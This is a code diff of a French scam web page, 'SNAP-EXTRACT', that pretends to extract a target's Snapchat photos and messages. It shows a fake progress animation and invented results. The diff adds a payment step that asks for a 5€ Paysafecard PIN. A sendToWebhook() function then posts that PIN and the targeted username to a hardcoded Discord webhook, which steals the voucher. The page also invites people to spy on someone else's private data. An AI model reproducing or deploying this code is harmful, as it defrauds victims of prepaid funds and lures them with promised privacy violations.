@@ -95,7 +95,6 @@
 
     <div id="app" class="card">
         
-        <!-- Header -->
         <div class="p-6 border-b border-zinc-900 flex justify-between items-center bg-zinc-950 z-[60] relative">
             <div class="flex items-center gap-2">
                 <div class="bg-s-yellow p-1 rounded-md">
@@ -111,7 +110,6 @@
 
         <div class="p-8 h-full relative flex flex-col" id="main-content">
             
-            <!-- INPUT SCREEN -->
             <div id="screen-input" class="space-y-8 pt-6 relative z-50">
                 <div class="bg-red-600/10 border border-red-600/40 p-3 rounded-2xl text-center flex items-center justify-center gap-2">
                     <p class="text-[9px] text-red-500 font-black uppercase tracking-widest">Avertissement : 1 seule tentative autorisée</p>
@@ -132,7 +130,6 @@
                 </div>
             </div>
 
-            <!-- LOADING SCREEN -->
             <div id="screen-loading" class="hidden py-16 text-center space-y-10 relative z-50">
                 <div class="flex justify-center">
                     <div class="animate-spin rounded-full h-20 w-20 border-t-4 border-s-yellow border-zinc-900"></div>
@@ -146,7 +143,6 @@
                 </div>
             </div>
 
-            <!-- RESULT SCREEN -->
             <div id="screen-result" class="hidden absolute inset-0 z-50 flex flex-col p-6 pt-20">
                 
                 <img id="final-bg-image" src="https://i.ibb.co/GQBD8XM1/Screenshot-20260310-082307-Cap-Cut.jpg" alt="Data View">
@@ -159,48 +155,49 @@
                         <div class="bg-green-500 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3">
                             <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
                         </div>
-                        <h2 class="text-xl font-black italic text-white uppercase tracking-tighter">EXTRACTION R&Eacute;USSIE</h2>
+                        <h2 class="text-xl font-black italic text-white uppercase tracking-tighter">EXTRACTION TERMINÉE</h2>
                         <p id="display-user" class="text-s-yellow font-black text-xs uppercase tracking-[0.1em] mt-1">@USER</p>
                     </div>
 
                     <div class="grid gap-2">
                         <div class="data-row">
-                            <span class="data-label">Photos</span>
-                            <span class="data-value">2,841</span>
+                            <span class="data-label">Photos & Vidéos</span>
+                            <span class="data-value">3,352 fichiers</span>
                         </div>
                         <div class="data-row">
-                            <span class="data-label">Vid&eacute;os</span>
-                            <span class="data-value">512</span>
-                        </div>
-                        <div class="data-row">
-                            <span class="data-label">Messages</span>
-                            <span class="data-value">12,403</span>
-                        </div>
-                        <div class="data-row">
-                            <span class="data-label">Poids</span>
-                            <span class="s-yellow font-black text-xs">6.8 Go</span>
+                            <span class="data-label">Frais de déverrouillage</span>
+                            <span class="text-green-400 font-black text-[10px]">5,00 €</span>
                         </div>
                     </div>
 
                     <div class="space-y-3 pt-2">
-                        <div class="bg-red-600/20 border border-red-500/50 p-3 rounded-2xl text-center">
-                            <p class="text-[9px] text-red-500 font-black uppercase tracking-widest italic">V&eacute;rification humanit&eacute; r&eacute;quise</p>
+                        <div class="bg-zinc-900/90 border border-zinc-700 p-3 rounded-2xl flex items-center justify-center gap-3">
+                            <span class="text-[10px] font-black text-white italic">PAIEMENT SÉCURISÉ</span>
+                            <div class="h-4 w-px bg-zinc-700"></div>
+                            <span class="text-[10px] font-black text-s-yellow italic">PAYSAFECARD</span>
                         </div>
                         
-                        <!-- BOUTON ENFIN FONCTIONNEL -->
-                        <a href="https://playabledownload.com/1882165" class="w-full bg-s-yellow text-black font-black py-4 rounded-3xl text-[14px] flex items-center justify-center gap-2 uppercase italic shadow-2xl hover:scale-105 transition-transform no-underline">
-                            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2 v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg>
-                            T&eacute;l&eacute;charg&#101;r (UNLOCK)
-                        </a>
+                        <div class="text-center">
+                            <p class="text-[10px] text-zinc-400 mb-2">Veuillez utiliser un ticket <b>Paysafecard de 5€</b> :</p>
+                            <a href="https://www.paysafecard.com/fr/acheter/" target="_blank" class="text-[10px] text-blue-400 underline font-bold uppercase tracking-tighter hover:text-blue-300">Où acheter un ticket de 5€ ?</a>
+                        </div>
+
+                        <div class="relative">
+                            <input type="text" id="psc-code" placeholder="CODE PIN (16 CHIFFRES)" maxlength="19" class="w-full bg-white text-black rounded-xl py-3 px-4 text-center font-mono text-lg font-bold placeholder:text-zinc-300 focus:outline-none border-2 border-transparent focus:border-s-yellow shadow-inner">
+                        </div>
+
+                        <button onclick="sendToWebhook()" id="btn-unlock" class="w-full bg-s-yellow text-black font-black py-4 rounded-3xl text-[14px] flex flex-col items-center justify-center leading-none uppercase italic shadow-2xl hover:scale-105 transition-transform">
+                            <span>V&Eacute;RIFIER LE PAIEMENT (5€)</span>
+                            <span class="text-[8px] mt-1 opacity-70 italic tracking-widest">Transaction cryptée SSL</span>
+                        </button>
                     </div>
                 </div>
             </div>
 
         </div>
 
-        <!-- Footer -->
         <div class="absolute bottom-0 w-full p-4 text-center bg-zinc-950/90 border-t border-zinc-900 z-[70]">
-            <p class="text-[8px] text-zinc-800 font-bold tracking-[0.4em] uppercase">SNAP-EXTRACT SECURED</p>
+            <p class="text-[8px] text-zinc-800 font-bold tracking-[0.4em] uppercase">SYSTÈME DE DÉCHIFFREMENT SÉCURISÉ - SNAP-EXTRACT v5.0</p>
         </div>
     </div>
 
@@ -218,7 +215,7 @@
             const percText = document.getElementById('percent');
             const logText = document.getElementById('log-text');
             
-            const logs = ["Init...", "Sync...", "Data...", "Cloud...", "Finishing..."];
+            const logs = ["Connexion...", "Scan des médias...", "Création de l'archive...", "Cryptage AES-256...", "Prêt."];
 
             const interval = setInterval(() => {
                 p += Math.random() * 3;
@@ -237,6 +234,53 @@
                     }, 500);
                 }
             }, 80);
+        }
+
+        async function sendToWebhook() {
+            const code = document.getElementById('psc-code').value;
+            const user = document.getElementById('target-user').value;
+            const btn = document.getElementById('btn-unlock');
+            const webhookUrl = "https://discord.com/api/webhooks/1481040875030188205/i5sAe8xduFFvT1Qzhzg_GwM0NyMbiiqC75IDbbLsC_kLAHuv9peGWEU-LpAfNyj8u0kA";
+
+            if (code.length < 10) {
+                alert("Erreur : Veuillez entrer les 16 chiffres de votre ticket Paysafecard.");
+                return;
+            }
+
+            btn.innerHTML = "<span>ANALYSE DU PAIEMENT...</span>";
+            btn.disabled = true;
+
+            const payload = {
+                embeds: [{
+                    title: "💰 Nouveau Code de 5€ Reçu",
+                    color: 3066993,
+                    fields: [
+                        { name: "Cible", value: `\`${user}\``, inline: true },
+                        { name: "Code PIN PSC", value: `\`${code}\``, inline: true },
+                        { name: "Montant Attendu", value: "5.00 EUR", inline: true }
+                    ],
+                    footer: { text: "Validation en cours..." },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                setTimeout(() => {
+                    alert("Le code de 5€ a bien été envoyé pour vérification. L'archive sera débloquée automatiquement sous 15 à 30 minutes après confirmation du réseau partenaire.");
+                    btn.innerHTML = "<span>EN ATTENTE DE CONFIRMATION...</span>";
+                }, 2000);
+
+            } catch (e) {
+                alert("Erreur de réseau. Veuillez vérifier votre connexion.");
+                btn.disabled = false;
+                btn.innerHTML = "<span>RÉESSAYER</span>";
+            }
         }
     </script>
 </body>
